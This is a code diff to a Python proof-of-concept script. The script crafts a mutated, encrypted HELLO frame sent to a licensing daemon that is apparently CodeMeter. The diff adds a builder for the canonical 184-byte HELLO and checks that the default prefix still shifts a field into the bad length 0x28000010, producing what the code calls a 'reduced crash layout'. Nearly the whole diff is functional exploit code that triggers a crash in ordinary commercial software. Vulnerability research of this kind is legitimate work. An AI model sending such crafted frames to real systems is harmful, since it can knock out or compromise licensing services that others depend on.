@@ -3,6 +3,8 @@
 
 This file intentionally has no project-local imports and reads no captured
 session data files. Its only non-stdlib Python dependency is `cryptography`.
+The canonical HELLO plaintext is built from a zero-filled 184-byte message plus
+the few observed fixed fields needed to match the captured testbench HELLO.
 
 It sends one valid encrypted SAMC client-to-daemon frame whose decrypted
 plaintext is:
@@ -28,24 +30,21 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
 DEFAULT_PREFIX_HEX = "5e355ed6f2"
+DEFAULT_MUTATED_HELLO_HEAD_HEX = "5e355ed6f20a00000000000010000028"
 EXPECTED_BAD_LEN = 0x28000010
+HELLO_LEN = 184
 HELLO_TOKEN_OFFSET = 28
 HELLO_TOKEN_LEN = 4
 
-CANONICAL_HELLO_HEX = """
-0a000000000000100000280000000000000000000000000000000000bd5139000000720000000000
-00000000000000000000000000000000000000000000000000000000000000000000000000000000
-00000000000000000000000000000000000000000000000000000000000000000000000000000000
-00000000000000000000000000000000000000000000000000000000000000000000000000000000
-000000000000000000000000000000000000000000000000
-"""
-
-
-def hex_to_bytes(text: str) -> bytes:
-    return bytes.fromhex("".join(text.split()))
-
-
-CANONICAL_HELLO = hex_to_bytes(CANONICAL_HELLO_HEX)
+# Non-token bytes observed in the captured canonical HELLO plaintext. Everything
+# else in the 184-byte HELLO is zero. Avoid assigning protocol names where the
+# binary-only analysis has not proven semantics.
+HELLO_FIXED_BYTES = {
+    0x00: 0x0A,  # HELLO opcode.
+    0x07: 0x10,  # observed fixed field.
+    0x0A: 0x28,  # observed fixed field; shifted by the prefix into bad length.
+    0x22: 0x72,  # observed fixed field.
+}
 
 
 def magic_div_1009(eax: int) -> int:
@@ -97,11 +96,37 @@ def encrypt_c2d_frame(plaintext: bytes, t: int) -> bytes:
     return header + body
 
 
+def validate_hello_shape(hello: bytes) -> None:
+    """Assert that the built HELLO matches the captured shape modulo token."""
+    if len(hello) != HELLO_LEN:
+        raise AssertionError(f"HELLO length is {len(hello)}, expected {HELLO_LEN}")
+    token_end = HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN
+    for offset, byte in enumerate(hello):
+        if HELLO_TOKEN_OFFSET <= offset < token_end:
+            continue
+        expected = HELLO_FIXED_BYTES.get(offset, 0)
+        if byte != expected:
+            raise AssertionError(
+                f"HELLO byte 0x{offset:x} is 0x{byte:02x}, expected 0x{expected:02x}"
+            )
+
+
+def build_canonical_hello(token: bytes) -> bytes:
+    """Build the captured canonical HELLO shape with a fresh client token."""
+    if len(token) != HELLO_TOKEN_LEN:
+        raise ValueError(f"HELLO token must be {HELLO_TOKEN_LEN} bytes")
+    hello = bytearray(HELLO_LEN)
+    for offset, byte in HELLO_FIXED_BYTES.items():
+        hello[offset] = byte
+    hello[HELLO_TOKEN_OFFSET:HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN] = token
+    built = bytes(hello)
+    validate_hello_shape(built)
+    return built
+
+
 def fresh_hello() -> tuple[bytes, bytes]:
     token = os.urandom(HELLO_TOKEN_LEN)
-    hello = bytearray(CANONICAL_HELLO)
-    hello[HELLO_TOKEN_OFFSET:HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN] = token
-    return bytes(hello), token
+    return build_canonical_hello(token), token
 
 
 def u32_words(data: bytes, count: int = 4) -> list[int]:
@@ -110,6 +135,21 @@ def u32_words(data: bytes, count: int = 4) -> list[int]:
         if offset + 4 <= len(data):
             words.append(struct.unpack_from("<I", data, offset)[0])
     return words
+
+
+def validate_default_crash_layout(prefix: bytes, payload: bytes) -> None:
+    """Assert the default prefix still creates the reduced crash layout."""
+    if prefix != bytes.fromhex(DEFAULT_PREFIX_HEX):
+        return
+    expected_head = bytes.fromhex(DEFAULT_MUTATED_HELLO_HEAD_HEX)
+    if payload[:len(expected_head)] != expected_head:
+        raise AssertionError(
+            f"mutated HELLO head is {payload[:len(expected_head)].hex()}, "
+            f"expected {expected_head.hex()}"
+        )
+    bad_len = struct.unpack_from("<I", payload, 0x0C)[0]
+    if bad_len != EXPECTED_BAD_LEN:
+        raise AssertionError(f"bad length is 0x{bad_len:08x}, expected 0x{EXPECTED_BAD_LEN:08x}")
 
 
 def codemeter_pid_from_proc() -> int | None:
@@ -146,7 +186,7 @@ def print_packet_summary(prefix: bytes, token: bytes, payload: bytes, wire: byte
     print("=== packet ===")
     print(f"prefix_hex={prefix.hex()}")
     print(f"fresh_client_token={token.hex()}")
-    print(f"canonical_hello_len={len(CANONICAL_HELLO)}")
+    print(f"canonical_hello_len={HELLO_LEN}")
     print(f"mutated_hello_len={len(payload)}")
     print(f"mutated_hello_head={payload[:16].hex()}")
     print("mutated_hello_first_u32_le=" + ",".join(f"0x{word:08x}" for word in words))
@@ -187,6 +227,7 @@ Examples:
 
     hello, token = fresh_hello()
     payload = prefix + hello
+    validate_default_crash_layout(prefix, payload)
     wire = encrypt_c2d_frame(payload, int(time.time()))
     print_packet_summary(prefix, token, payload, wire)
 
